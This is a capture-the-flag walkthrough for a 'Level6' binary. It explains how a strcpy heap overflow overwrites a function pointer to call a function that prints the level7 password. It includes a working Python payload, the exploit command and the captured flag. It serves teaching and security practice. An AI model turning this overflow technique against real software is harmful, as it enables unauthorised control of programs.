# Level6 - Complete Step-by-Step Explanation

## What Happened: The Complete Story

This document provides the detailed, step-by-step explanation of how we exploited Level6 through heap buffer overflow and function pointer hijacking.

## Understanding What the Program Does Normally

### Program Structure Analysis
When you run Level6 with a normal argument, here's what happens:

```c
// Simplified version of what Level6 does:
int main(int argc, char **argv) {
    char *buffer1 = malloc(64);      // Allocate 64 bytes on heap
    void (**funcptr)() = malloc(4);  // Allocate 4 bytes for function pointer
    
    *funcptr = m;                    // Set function pointer to m() function  
    strcpy(buffer1, argv[1]);        // Copy your argument into buffer
    (*funcptr)();                    // Call whatever function the pointer points to
}
```

### The Two Functions Available

**Function m() - Default behavior:**
```c
void m() {
    puts("Nope");  // Just prints "Nope" and exits
}
```
- **Address**: 0x08048468
- **What it does**: Prints "Nope" message
- **This is what normally gets called**

**Function n() - Our target:**
```c  
void n() {
    system("/bin/cat /home/user/level7/.pass");  // Shows the flag!
}
```
- **Address**: 0x08048454  
- **What it does**: Calls system() to show level7 password
- **This is what we WANT to call**

## Step 1: Identifying the Vulnerability

### The Problem: strcpy() with No Bounds Checking

The critical line is:
```c
strcpy(buffer1, argv[1]);  // DANGEROUS - copies ALL of argv[1]
```

**Why this is dangerous:**
- `buffer1` is only 64 bytes long
- `strcpy()` copies the ENTIRE `argv[1]` string
- If `argv[1]` is longer than 64 bytes, it keeps writing past the end
- This overwrites whatever comes after `buffer1` in memory

## Step 2: Understanding Heap Memory Layout

### How Heap Memory is Organized

When the program calls:
```c
char *buffer1 = malloc(64);      // First allocation
void (**funcptr)() = malloc(4);  // Second allocation  
```

The heap memory looks like this:
```
┌─────────────────┬──────────────┬─────────────────┐
│   buffer1       │ heap metadata │    funcptr     │
│   (64 bytes)    │  (~8 bytes)   │   (4 bytes)    │ 
│ "for strcpy"    │ "chunk info"  │ "points to m()" │
└─────────────────┴──────────────┴─────────────────┘
```

**Key insights:**
- The allocations are **adjacent** in memory
- There's ~8 bytes of heap metadata between them
- The function pointer is stored right after buffer1
- If we overflow buffer1, we can overwrite the function pointer!

## Step 3: Calculating the Exact Offset

### Distance Calculation

To overwrite the function pointer, we need to know exactly how many bytes to write:

```
buffer1 size:     64 bytes  (the malloc(64) allocation)
heap metadata:   + 8 bytes  (malloc chunk headers)
-----------------------------------------
Total offset:     72 bytes  (to reach the function pointer)
```

**This means:**
- Bytes 1-64: Fill up buffer1 completely
- Bytes 65-72: Overwrite the heap metadata  
- Bytes 73-76: Overwrite the function pointer with our target address

## Step 4: Crafting the Attack Payload

### Building the Exploit

```python
#!/usr/bin/env python2
import struct

# Our target: function n() which calls system()
n_function = 0x08048454

# Calculate the payload:
offset = 72                                    # Bytes needed to reach funcptr
padding = "A" * offset                         # 72 'A' characters as filler
target_address = struct.pack("<L", n_function) # n() address in little-endian format

payload = padding + target_address
print payload
```

**What this creates:**
```
Payload: "AAAAAAA...AAAAAAA\x54\x84\x04\x08"
         └── 72 A's ──┘ └─ address of n() ─┘
```

## Step 5: The Attack in Motion

### What Happens When You Run the Exploit

When you execute: `./level6 $(python exploit.py)`

**Step-by-step execution:**

1. **Program starts**: `main()` function begins
2. **First malloc(64)**: Creates `buffer1` on the heap
3. **Second malloc(4)**: Creates `funcptr` storage adjacent to `buffer1`
4. **Initialize funcptr**: `*funcptr = m` → function pointer points to 0x08048468 (function m)
5. **strcpy() call**: `strcpy(buffer1, argv[1])` copies our 76-byte payload:
   - **Bytes 1-64**: Fill `buffer1` completely with 'A's
   - **Bytes 65-72**: Overwrite heap metadata with 'A's  
   - **Bytes 73-76**: Overwrite `funcptr` with `\x54\x84\x04\x08` (address of n)
6. **Function call**: `(*funcptr)()` now calls 0x08048454 instead of 0x08048468
7. **Success**: Function n() executes → system() runs → flag displayed!

## Step 6: Memory State Transformation

### Before the Attack
```
Heap Memory (Normal State):
┌─────────────────┬──────────────┬─────────────────┐
│     empty       │ heap headers │   0x08048468   │ ← Points to m()
│   (buffer1)     │              │   (funcptr)    │
└─────────────────┴──────────────┴─────────────────┘
```

### After the Attack  
```
Heap Memory (Corrupted State):
┌─────────────────┬──────────────┬─────────────────┐
│ AAAA...AAAA     │ AAAAAAAA     │   0x08048454   │ ← Now points to n()!
│ (72 A's)        │ (overwritten)│   (hijacked!)  │
└─────────────────┴──────────────┴─────────────────┘
```

## Step 7: Why This Attack Works So Well

### The Beauty of Function Pointer Hijacking

**Advantages of this technique:**
1. **No shellcode needed**: We use existing function n() instead of injecting code
2. **No complex ROP chains**: Simple single function redirect
3. **Minimal payload**: Only 76 bytes total
4. **Very reliable**: Predictable heap layout ensures it works consistently
5. **Stealthy**: Uses existing program functions, harder to detect

### Execution Flow Comparison

**Normal execution:**
```
main() → malloc() → malloc() → *funcptr=m → strcpy() → (*funcptr)() → m() → puts("Nope")
```

**Exploited execution:**
```
main() → malloc() → malloc() → *funcptr=m → strcpy() → [OVERFLOW] → (*funcptr)() → n() → system() → FLAG!
                                                          │                │         │
                                                          └─ overwrites    │         └─ level7 password
                                                             funcptr to ────┘
                                                             point to n()
```

## Step 8: Understanding the Results

### What You Saw When It Worked

**Command executed:**
```bash
./level6 $(python exploit.py)
```

**Output received:**
```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

**Why this indicates success:**
- ✅ **No "Nope" message**: This proves we bypassed function m()
- ✅ **Flag displayed**: This proves function n() was called instead  
- ✅ **No segfault**: This proves our offset calculation was correct
- ✅ **Flag format**: This proves system() executed successfully with level7 privileges

## Step 9: Technical Deep Dive

### Why Exactly 72 Bytes?

**Heap chunk structure on 32-bit systems:**
```
┌───────────────┬───────────────┬─────────────────┐
│  prev_size    │     size      │   user_data     │
│   4 bytes     │   4 bytes     │   64 bytes      │
└───────────────┴───────────────┴─────────────────┘
```

**Distance calculation:**
- `buffer1` starts at user_data section (64 bytes)
- Heap metadata (prev_size + size) = 8 bytes  
- `funcptr` allocation starts after metadata
- Total: 64 + 8 = 72 bytes to reach `funcptr`

### Little-Endian Address Encoding

**Why `\x54\x84\x04\x08` instead of `0x08048454`?**

x86 processors use little-endian byte ordering:
```
Address: 0x08048454
Stored as: 54 84 04 08 (bytes reversed)
Python: struct.pack("<L", 0x08048454) → "\x54\x84\x04\x08"
```

## Step 10: Security Implications

### What This Attack Demonstrates

**Vulnerability classes shown:**
1. **CWE-122**: Heap-based Buffer Overflow
2. **CWE-676**: Use of Potentially Dangerous Function (strcpy)
3. **CWE-252**: Unchecked Return Value (missing input validation)
4. **CWE-787**: Out-of-bounds Write

**Attack sophistication:**
- **Medium complexity**: Requires understanding heap layout
- **High impact**: Complete control of program execution
- **Reliable exploitation**: Predictable memory layout enables consistent success
- **Stealthy technique**: Uses existing code paths, avoiding detection

## Summary: The Complete Picture

### What We Achieved

We successfully:
1. **Identified the vulnerability**: strcpy() without bounds checking
2. **Analyzed the memory layout**: Calculated exact heap structure  
3. **Found the target**: Located function n() with system() call
4. **Calculated precise offsets**: Determined 72-byte overflow needed
5. **Crafted the payload**: Created exact input to corrupt function pointer
6. **Executed the attack**: Redirected execution flow to desired function
7. **Obtained the flag**: Successfully escalated to level7 privileges

### Key Skills Demonstrated

- **Binary reverse engineering**: Understanding program structure from assembly
- **Heap memory analysis**: Calculating malloc() layout and metadata structure  
- **Vulnerability assessment**: Identifying and exploiting buffer overflow conditions
- **Exploit development**: Creating precise memory corruption payloads
- **Function pointer hijacking**: Advanced control flow redirection techniques

This level showcases sophisticated heap exploitation requiring deep understanding of dynamic memory management, binary analysis, and precision exploit development - representing advanced binary security skills applicable to modern penetration testing and security research.

**Final Result**: Level7 password obtained: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`